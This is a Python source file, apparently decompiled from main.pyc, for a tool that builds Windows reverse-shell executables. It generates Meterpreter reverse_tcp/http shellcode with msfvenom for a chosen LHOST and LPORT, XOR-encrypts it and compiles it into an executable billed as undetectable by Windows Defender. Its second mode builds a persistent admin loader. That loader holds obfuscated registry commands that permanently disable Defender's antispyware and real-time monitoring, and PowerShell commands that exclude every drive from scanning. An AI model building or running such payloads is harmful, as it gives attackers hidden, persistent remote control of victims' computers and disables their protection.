from shutil import which
from time import sleep

import os, random, re, platform

# Original file path
dir_path = os.path.dirname(os.path.realpath(__file__))

if platform.system() == 'Linux':
    gcc = 'x86_64-w64-mingw32-g++'
    windres = 'x86_64-w64-mingw32-windres'

elif platform.system() == 'Windows':
    gcc = 'g++'
    windres = 'windres'

else:
    print('[-] Only Windows and Linux are supported')
    exit(0)

def print_banner():
    if platform.system() == "Linux":
        os.system("clear")
    else:
        os.system("cls")
    print(open(os.path.join(dir_path, 'banner.txt')).read(), 'magenta')

try:
    from termcolor import colored
    from builtins import print as _print
    from builtins import input as _input

    def print(message, color=None, end='\n'):
        _print((colored(message, color)), end=end)


    def input(message, color=None):
        return _input(colored(message, color))

    print_banner()
except:
    print_banner()

    print("[-] Cannot import module termcolor | Install using 'pip3 install termcolor'")
    print('[-] Output will not be colored')
    from builtins import print as _print
    from builtins import input as _input

    def print(message, color=None, end='\n'):
        _print(message, end=end)


    def input(message, color=None):
        return _input(message)


def xor_encrypt(data, key):
    key = [ord(k) for k in key]
    return [ord(data[i]) ^ key[(i % len(key))] for i in range(len(data))]


def xor_encrypt_for_template(commands, key):
    blobs = list()
    for command in commands:
        blobs.append(xor_encrypt(command, key))

    op_stack = list()
    
    op_stack.append(f"int key_len = {len(key)};")
    op_stack.append(f"int key[] = {{ {str([ord(k) for k in key])[1:-1]} }};")
    
    op_stack.append(f"int num_commands = {len(commands)};")
    op_stack.append(f"int size_of_commands[] = {{ {', '.join([str(len(data)) for data in blobs])} }};")
    
    max_length = max([len(data) for data in blobs])
    
    op_stack.append(f"int max_command_size = {max_length};")
    op_stack.append(f"int commands[][{max_length}] = {{ {', '.join(['{' + str(blob)[1:-1] + '}' for blob in blobs])} }};")
    
    return '\n'.join(op_stack)


def generate_payload(msf_command, output_filename):
    os.system(msf_command)
    try:
        reverse_shellcode = open(os.path.join(dir_path, '_payload.c'))
    except FileNotFoundError:
        print('[-] Msfvenom payload not found', 'red')
        exit()
    
    reverse_shellcode = reverse_shellcode.read()
    
    os.remove(os.path.join(dir_path, '_payload.c'))
    
    reverse_shell = re.findall('\\\\x([a-f0-9][a-f0-9])', reverse_shellcode)
    shellcode_len = len(reverse_shell)
    
    password = str(random.randint(1000000000, 9999999999))
    
    reverse_shell = 'int enc_shellcode[] = { ' + ', '.join([str(int(code, 16) ^ ord(password[(i % len(password))])) for i, code in enumerate(reverse_shell)]) + ' };\n'
    reverse_shell += f"int shellcode_length = {shellcode_len};\n"
    reverse_shell += f'char password[] = "{password}";\n'
    reverse_shell += f"int password_len = {len(password)};\n"
    
    rev_shell = open(os.path.join(dir_path, 'reverse_shell_template.cpp'), 'r+')
    reverse_shell = reverse_shell + rev_shell.read()
    
    rev_shell = open(os.path.join(dir_path, '_revshell.cpp'), 'w+')
    rev_shell.write(reverse_shell)
    rev_shell.close()
    
    os.system(f"{gcc} -s {os.path.join(dir_path, '_revshell.cpp')} -o {os.path.join(dir_path, output_filename)}")
    
    os.remove(os.path.join(dir_path, '_revshell.cpp'))


def clear():
    if platform.system() == 'Linux':
        os.system('clear')
        print_banner()
    else:
        os.system('cls')
        print_banner()


def main():
    not_installed_pacakges = list()

    print('[*] Checking required packages', 'yellow')

    if which('msfvenom'):
        print('[+] msfvenom is installed', 'green')
    else:
        print('[-] msfvenom not found', 'red')
        not_installed_pacakges.append('msfvenom')
    
    if which(gcc):
        print(f"[+] {gcc} is installed", 'green')
    else:
        print(f"[-] {gcc} not found", 'red')
        not_installed_pacakges.append(gcc)
    
    if which(windres):
        print(f"[+] {windres} is installed", 'green')
    else:
        print(f"[-] {windres} not found", 'red')
        not_installed_pacakges.append(windres)
    
    if not_installed_pacakges:
        print(f"[-] These packages are required and not installed : {', '.join(not_installed_pacakges)}", 'red')
        exit(0)
    else:
        print('[~] All required packages are installed', 'yellow')
    
    print('[!] Loading...', 'yellow')
    sleep(2)
    print_banner()

    print('[*] Available Reverse Shells : ', 'yellow')
    print('    1) Undetectable Reverse Shell ( Bypasses Windows Defender )', 'yellow')
    print('    2) Persistent Advanced Reverse Shell ( Requires Admin Priviledges to run )', 'yellow')
    
    ch = int(input('[?] Choose a reverse shell [1-2] : ', 'blue'))
    
    if ch == 1:
        print('\n')
        print('[!] This is an undetectable reverse shell', 'yellow')
        print('[!] Even if it triggers Windows Defender, the exe file will not be detected', 'yellow')
        print("[*] Limitations : Triggers some Antiviruses if 'getsystem' is executed on meterpreter, however the reverse shell is not terminated", 'yellow')

    elif ch == 2:
        print('\n')
        print('[!] This is an advanced loader that first disables Windows Defender and then loads the undetectable reverse shell', 'green')
        print('[!] It requires Admin Priviledges to run', 'green')
        print('[!] It will also make the reverse shell persistent', 'green')
        print('[!] After every reboot, the reverse shell will be activated as Admin', 'green')
        print('[!] Windows Defender will be disabled forever!', 'green')

    else:
        print('[-] Wrong input', 'red')
        exit()
    
    input('[?] Press Enter to continue', 'yellow')
    clear()
    
    arch = input('[?] Enter arch [x86/x64] : ', 'blue')
    
    if not arch == 'x86':
        if not arch == 'x64':
            print('[-] Wrong input', 'red')
            exit()
    
    payload = input('[?] Enter a msfvenom windows payload [http/tcp] : ', 'blue')
    
    if not payload == 'http':
        if not payload == 'tcp':
            print('[-] Wrong input', 'red')
            exit()
    
    lhost = input('[?] Enter LHOST : ', 'blue')
    
    try:
        lport = int(input('[?] Enter LPORT : ', 'blue'))
    except:
        print('[-] Wrong input', 'red')
        exit()
    
    payload_name = input('[?] Enter output filename [payload.exe] : ', 'blue') or 'payload.exe'
    
    print('[!] Generating metasploit payload...', 'yellow')
    
    if arch == 'x86':
        payload = 'windows/meterpreter/reverse_' + payload
    
    elif arch == 'x64':
        payload = 'windows/x64/meterpreter/reverse_' + payload
    
    if ch == 2:
        generate_payload(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} prpendmigrateprocess=explorer.exe prependmigrate=true -f c -o {os.path.join(dir_path, '_payload.c')}", '_payload.exe')
        
        try:
            payload = open(os.path.join(dir_path, '_payload.exe'), 'rb')
            print('[*] Success, msfvenom payload created', 'green')
            print('[!] Encrypting msfvenom payload...', 'yellow')
        except FileNotFoundError:
            print('[-] Msfvenom payload not found', 'red')
            exit()
    
        payload = bytearray(payload.read())
        commands = list()
        
        # Disable Windows Defender using Registry
        commands.append('reg Add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 01 -f')
        commands.append('reg Add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 -f')
        
        # Add every drive to exclusion list of windows defender
        for i in range(ord('A'), ord('Z') + 1):
            commands.append(f'powershell.exe Add-MpPreference -ExclusionPath "{chr(i)}:\\\\" -Force')

        password = str(random.randint(1000000000, 9999999999))
        
        template_code = xor_encrypt_for_template(commands, password)
        
        template_code = f"int revShellLen = {len(payload)};\n" + template_code
        template_code = 'int revShellCode[] = { ' + ', '.join([str(c) for c in payload]) + ' };' + '\n' + template_code
        
        print('[*] Success, msfvenom payload encrypted', 'green')
        print('[!] Injecting msfvenom payload to custom loader...', 'yellow')
        
        template = open(os.path.join(dir_path, 'loader_template.cpp'), 'r+')
        template_code = template_code + '\n' + template.read()
        
        template = open(os.path.join(dir_path, 'payload.cpp'), 'w+')
        template.write(template_code)
        template.close()
        
        print('[*] Msfvenom payload successfully injected', 'green')
        print('[+] Compiling payload...', 'yellow')
        
        os.system(f"{windres} -i {os.path.join(dir_path, 'template.exe.rc')} -o {os.path.join(dir_path, 'rc.o')}")
        os.system(f"{gcc} -s {os.path.join(dir_path, 'payload.cpp')} {os.path.join(dir_path, 'rc.o')} -o {os.path.join(dir_path, payload_name)}")
        
        print('[*] Removing temp files...', 'yellow')
        
        # Deleting temp files
        os.remove(os.path.join(dir_path, '_payload.exe'))
        os.remove(os.path.join(dir_path, 'payload.cpp'))
        os.remove(os.path.join(dir_path, 'rc.o'))
    else:
        generate_payload(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} prpendmigrateprocess=explorer.exe prependmigrate=true -f c -o {os.path.join(dir_path, '_payload.c')}", payload_name)
    
    if os.path.exists(os.path.join(dir_path, payload_name)):
        os.system(f"mv {os.path.join(dir_path, payload_name)} .")
        print('[*] Success', 'green')
        print(f"[+] Payload saved to {payload_name}", 'green')
    else:
        print('[!] Some error occured', 'red')


if __name__ == '__main__':
    main()
# okay decompiling main.pyc
